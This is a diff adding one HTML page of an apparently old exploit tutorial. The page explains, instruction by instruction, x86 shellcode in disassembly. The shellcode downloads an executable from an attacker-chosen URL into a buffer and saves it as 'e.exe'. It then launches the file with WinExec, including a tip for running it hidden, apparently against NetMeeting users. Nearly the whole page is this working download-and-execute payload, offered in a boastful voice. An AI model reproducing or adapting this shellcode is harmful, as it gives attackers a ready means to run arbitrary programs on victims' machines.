@@ -1,0 +1,169 @@
+<html>
+<head>
+<title>Exploit!</title>
+</head>
+
+<body bgcolor=#000000 text=#FFFFFF link=#FF7F7F alink=#FFBFBF vlink=#FF3F3F>
+
+<blockquote>
+
+<font size=+3>The Shit</font><p>
+
+Time to do what we've come here to do. Lets write this thing:
+<pre>
+ 000001BB: 90                           nop
+ 000001BC: 90                           nop
+ 000001BD: 33C0                         xor    eax,eax
+ 000001BF: 6648                         dec    ax
+ 000001C1: D1E0                         shl    eax,1
+ 000001C3: 33D2                         xor    edx,edx
+ 000001C5: 50                           push   eax
+ 000001C6: 52                           push   edx
+ 000001C7: FF57EC                       call   d,[edi][-0014]
+ 000001CA: 8BF0                         mov    esi,eax
+</pre>
+This code allocates 131070 bytes of memory. EAX gets 131070, and we call
+GlobalAlloc, indirectly addressed from our jumptable -0x14 bytes from EDI.
+This stores the memory address in ESI. The type of GlobalAlloc is GMEM_FIXED
+(0), which results in a memory address being returned rather than an unlocked
+handle.
+<pre>
+ 000001CC: 33D2                         xor    edx,edx
+ 000001CE: 52                           push   edx
+ 000001CF: 52                           push   edx
+ 000001D0: 52                           push   edx
+ 000001D1: 52                           push   edx
+ 000001D2: 57                           push   edi
+ 000001D3: FF57F0                       call   d,[edi][-0010]
+</pre>
+Then, we create an Internet handle with a call to InternetOpenA. All the 
+parameters to InternetOpenA are zero in this case, so we're in luck.<p>
+The internet handle is returned in EAX and we'll immediately set it
+up as a parameter to the next function we call...
+<pre>
+ 000001D6: 33D2                         xor    edx,edx
+ 000001D8: 52                           push   edx
+ 000001D9: 52                           push   edx
+ 000001DA: 52                           push   edx
+ 000001DB: 90                           nop
+ 000001DC: 52                           push   edx
+ 000001DD: 8BD7                         mov    edx,edi
+ 000001DF: 83EA50                       sub    edx,050  ;"P"
+ 000001E2: 90                           nop
+ 000001E3: 90                           nop
+ 000001E4: 90                           nop
+ 000001E5: 52                           push   edx
+ 000001E6: 50                           push   eax
+ 000001E7: FF57F8                       call   d,[edi][-0008]
+</pre>
+This code makes a call to InternetOpenUrlA (at [EDI-0x08]), invoking our 
+chosen URL. The URL type is unspecified in the code, so the URL can be 
+HTTP,FTP,FILE,GOPHER,... whatever the hell you want.
+
+<pre>
+ 000001EA: 57                           push   edi
+ 000001EB: 33D2                         xor    edx,edx
+ 000001ED: 664A                         dec    dx
+ 000001EF: D1E2                         shl    edx,1
+ 000001F1: 52                           push   edx
+ 000001F2: 56                           push   esi
+ 000001F3: 50                           push   eax
+ 000001F4: FF57FC                       call   d,[edi][-0004]
+</pre>
+
+This code uses InternetReadFile (at [EDI-0x04]) to download up to 131070 bytes
+into our memory buffer (pointer in ESI). Note that we first pushed EDI. EDI is where we're going to store the count of how many bytes are actually read. This is needed to save the file to disk with the right size.<p>
+Note that there is a limit to the size of the exploit executable you can 
+download. Awww. If that's too small, then too fuckin bad. What the fuck are 
+you writing anyway, an MFC exploit? Shit...<p>
+
+<pre>
+ 000001F7: 90                           nop
+ 000001F8: 90                           nop
+ 000001F9: 90                           nop
+ 000001FA: 33D2                         xor    edx,edx
+ 000001FC: 52                           push   edx
+ 000001FD: 8BD7                         mov    edx,edi
+ 000001FF: 83EA30                       sub    edx,030  ;"0"
+ 00000202: 42                           inc    edx
+ 00000203: 90                           nop
+ 00000204: 90                           nop
+ 00000205: 52                           push   edx
+ 00000206: FF57D8                       call   d,[edi][-0028]
+</pre>
+
+This calls _lcreat (at [edi-0x28]) to create a file in which to dump our
+memory buffer. Time to give this data a home! The filename is chosen by looking
+at the last 5 characters of the url. In this case, it's "e.exe". The file will
+be created in the place where exploit was launched (usually the person's
+SpeedDial directory in the case of Netmeeting).
+
+<pre>
+ 00000209: FF37                         push   d,[edi]
+ 0000020B: 56                           push   esi
+ 0000020C: 50                           push   eax
+ 0000020D: 8BD8                         mov    ebx,eax
+ 0000020F: FF57DC                       call   d,[edi][-0024]
+</pre>
+
+And now we do the actual write to disk with a call to _lwrite (at [edi-0x24]).
+The parameter for the number of bytes to write is located at [edi]. We also
+push the buffer location and the file handle returned by _lcreat. Before we
+call the function though, we save the handle in EBX, which is not modified
+by _lwrite.
+
+<pre>
+ 00000212: 53                           push   ebx
+ 00000213: FF57E0                       call   d,[edi][-0020]
+</pre>
+
+And then we close the file handle to get things committed. Now all that's
+left is to execute the file we downloaded and exit this process. We aren't
+going to bother cleaning up the memory allocation or anything like that. That
+would be nice, but fuck it, we're not here to be nice.
+
+<pre>
+ 00000216: 90                           nop
+ 00000217: 90                           nop
+ 00000218: 90                           nop
+ 00000219: 33D2                         xor    edx,edx
+ 0000021B: 42                           inc    edx
+ 0000021C: 52                           push   edx
+ 0000021D: 8BD7                         mov    edx,edi
+ 0000021F: 83EA30                       sub    edx,030  ;"0"
+ 00000222: 42                           inc    edx
+ 00000223: 90                           nop
+ 00000224: 90                           nop
+ 00000225: 52                           push   edx
+ 00000226: FF57E4                       call   d,[edi][-001C]
+</pre>
+
+Alright, now we just tell WinExec to run the executable! Note that the first
+'inc edx' is to select "Show Window" mode for the executable. If you want
+the executable to run in 'hidden' mode, you should nop that line out, and
+it will use SW_HIDE instead of SW_SHOWNORMAL as the second parm to WinExec.
+the first parm is the filename. Run it!
+
+<pre>
+ 00000229: 90                           nop
+ 0000022A: 90                           nop
+ 0000022B: 90                           nop
+ 0000022C: FF57E8                       call   d,[edi][-0018]
+</pre>
+
+And now we're done with this process. ExitProcess will clean up our mess.
+And so it was done.<p>
+
+</blockquote>
+
+<center>
+<a href="final.html"><font size=+1>Awwww yeah that felt good.</font></a><p>
+<a href="page8.html"><font size=+1>Take me back.</font></a><p>
+</center>
+
+
+</body>
+
+</html>
+
+
